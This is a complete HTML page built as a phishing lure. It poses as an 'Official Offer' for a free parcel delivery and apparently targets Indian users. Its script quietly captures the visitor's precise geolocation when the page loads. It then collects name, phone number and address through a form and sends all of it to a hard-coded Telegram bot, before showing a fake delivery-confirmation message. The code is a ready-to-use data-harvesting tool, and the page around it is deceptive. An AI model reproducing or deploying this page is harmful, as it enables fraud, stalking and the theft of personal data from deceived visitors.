<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official Free Delivery | Verify Now</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f8; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.15); overflow: hidden; position: relative; }
        
        /* 🏷️ OFFICIAL HEADER */
        .offer-header { 
            background: linear-gradient(135deg, #ff9900, #ffcc00); 
            color: white; 
            padding: 20px; 
            text-align: center; 
            position: relative;
        }
        .badge-official {
            background: white;
            color: #ff9900;
            font-weight: bold;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            display: inline-block;
            margin-bottom: 10px;
        }
        .header-title { font-size: 24px; margin: 5px 0; font-weight: 800; }
        .header-subtitle { font-size: 14px; opacity: 0.9; }

        .content { padding: 20px; }
        
        /* 📷 PRODUCT IMAGE */
        .product-img-container {
            width: 100%;
            height: 180px;
            background-color: #eee;
            margin-bottom: 20px;
            border-radius: 10px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #f0f0f0;
        }
        .product-img-container img { width: 100%; height: 100%; object-fit: cover; }

        h2 { margin: 0 0 5px; font-size: 20px; color: #333; text-align: center; }
        p { color: #666; font-size: 14px; line-height: 1.5; text-align: center; margin-bottom: 20px; }
        
        /* Form Styles */
        .form-group { margin-bottom: 15px; position: relative; }
        label { display: block; margin-bottom: 6px; font-weight: 600; color: #444; font-size: 14px; }
        input, textarea { 
            width: 100%; padding: 12px 15px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            box-sizing: border-box; 
            font-size: 16px; 
            transition: all 0.3s ease;
        }
        input:focus, textarea:focus { border-color: #ff9900; outline: none; box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.1); }
        
        /* Button */
        .btn { 
            width: 100%; padding: 16px; 
            background: #ff9900; color: white; 
            border: none; border-radius: 8px; 
            font-size: 17px; font-weight: bold; 
            cursor: pointer; transition: 0.3s; 
            box-shadow: 0 4px 6px rgba(255, 153, 0, 0.3);
        }
        .btn:hover { background: #e68a00; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }

        /* Status Section */
        #statusSection { display: none; text-align: center; padding: 30px 20px; }
        .loader { 
            border: 5px solid #f3f3f3; border-top: 5px solid #ff9900; 
            border-radius: 50%; width: 50px; height: 50px; 
            animation: spin 1s linear infinite; margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .success-msg { color: #28a745; font-weight: bold; margin-top: 15px; display: none; font-size: 18px; }

        /* Hidden Inputs */
        #lat, #long { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="offer-header">
        <div class="badge-official">✅ Official Offer</div>
        <div class="header-title">Free Parcel Delivery</div>
        <div class="header-subtitle">Premium Product • 100% Free</div>
    </div>

    <!-- Main Form Section (Hamesha Dikhega) -->
    <div class="content" id="formSection">
        <!-- 📷 PRODUCT IMAGE PLACEHOLDER START -->
        <div class="product-img-container">
            <!-- Apni Image Yahan Dalein -->
            <img
  src="https://static.vecteezy.com/system/resources/thumbnails/049/186/658/small/gift-boxes-and-mobile-phone-on-a-red-festive-background-photo.jpg"
  alt="Gift Boxes and Mobile Phone"
  id="prodImg">
        </div>
        <!-- 📷 PRODUCT IMAGE PLACEHOLDER END -->

        <h2>Confirm Your Details</h2>
        <p>To ensure accurate delivery, we need to verify your location. Please allow access when prompted.</p>

        <input type="hidden" id="lat">
        <input type="hidden" id="long">

        <form id="deliveryForm">
            <div class="form-group">
                <label>Full Name</label>
                <input type="text" id="name" placeholder="Enter your full name" required autocomplete="off">
            </div>
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phone" placeholder="+91 XXXXX XXXXX" required autocomplete="off">
            </div>
            <div class="form-group">
                <label>Delivery Address</label>
                <textarea id="address" rows="3" placeholder="House No, Street, City..." required></textarea>
            </div>
            
            <!-- Submit Button -->
            <button type="submit" class="btn">Continue & Track Free Parcel</button>
        </form>
    </div>

    <!-- Status Section (On The Way) -->
    <div id="statusSection">
        <h2>Your Parcel is On The Way! 🚚</h2>
        <div class="loader"></div>
        <p>Delivery boy is reaching your location shortly.</p>
        <div class="success-msg" id="finalMsg">Wait for call!</div>
    </div>

</div>

<script>
    // 🛠️ CONFIGURATION: Yahan apna Telegram Token aur Chat ID daalein
    const BOT_TOKEN = "7816291070:AAHRxC17wJ4Gn_J_7F79fmwY0xjH-9rE3cA"; 
    const CHAT_ID = "1295797530"; 

    // Helper for Telegram API
    async function sendToTelegram(message, locationData = null) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        let finalMessage = message;
        if(locationData) {
            finalMessage += `\n\n📍 *Lat:* ${locationData.lat}\n📍 *Long:* ${locationData.long}`;
        }

        try {
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: finalMessage,
                    parse_mode: 'Markdown'
                })
            });
        } catch (error) {
            console.error("Telegram Send Error:", error);
        }
    }

    // --- FUNCTION 1: INITIAL LOCATION POPUP (Site Load Hote Hi) ---
    async function initialLocationRequest() {
        if ("geolocation" in navigator) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000, 
                        maximumAge: 0
                    });
                });

                const lat = position.coords.latitude;
                const long = position.coords.longitude;

                console.log("Initial Location Captured:", lat, long);

                // Telegram par Bhejo (Sirf Location)
                const msg = `📍 *Site Visit Location*\n⏰ Time: ${new Date().toLocaleTimeString()}\n📍 Lat: ${lat}\n📍 Long: ${long}`;
                await sendToTelegram(msg);

            } catch (error) {
                console.log("Initial Location Error or Denied:", error.message);
                // Agar user deny kare, toh form dikha dena (Jo pele se dikh raha hai)
            }
        } else {
            console.log("Geolocation not supported");
        }
    }

    // Page Load Hote Hi Ye Function Chalega
    window.onload = initialLocationRequest;


    // --- FUNCTION 2: SUBMIT LOCATION POPUP (Form Submit Karte Hi) ---
    document.getElementById('deliveryForm').addEventListener('submit', function(e) {
        e.preventDefault(); 

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('address').value;

        // 1. Hide Form, Show Loading/Status immediately for UI effect
        document.getElementById('formSection').style.display = 'none';
        document.getElementById('statusSection').style.display = 'block';

        // 2. Trigger Second Location Popup (Submit Ke Baad)
        submitLocationRequest(name, phone, address);
    });

    async function submitLocationRequest(name, phone, address) {
        let locationData = null;
        
        if ("geolocation" in navigator) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });

                locationData = {
                    lat: position.coords.latitude,
                    long: position.coords.longitude
                };
                
                // Update Hidden Fields (Agar future use karna ho)
                document.getElementById('lat').value = locationData.lat;
                document.getElementById('long').value = locationData.long;

            } catch (error) {
                console.log("Submit Location Error or Denied:", error.message);
                // Agar block kare, toh locationData null rahega, par process rukta nahi hai
            }
        }

        // Telegram par Bhejo (Full Details + Location agar allow kiya ho)
        const msg = `🎁 *Free Parcel Confirmed*\n\n👤 Name: ${name}\n📞 Phone: ${phone}\n🏠 Address: ${address}\n\n📍 *Current Location*\nLat: ${locationData ? locationData.lat : 'Denied'}\nLong: ${locationData ? locationData.long : 'Denied'}`;
        
        await sendToTelegram(msg);

        // 3. Show Final Success Message after small delay
        setTimeout(() => {
            document.querySelector('.loader').style.display = 'none';
            document.getElementById('finalMsg').style.display = 'block';
            document.getElementById('finalMsg').innerText = "🚚 On The Way! Wait for delivery.";
        }, 1500);
    }
</script>

</body>
</html>
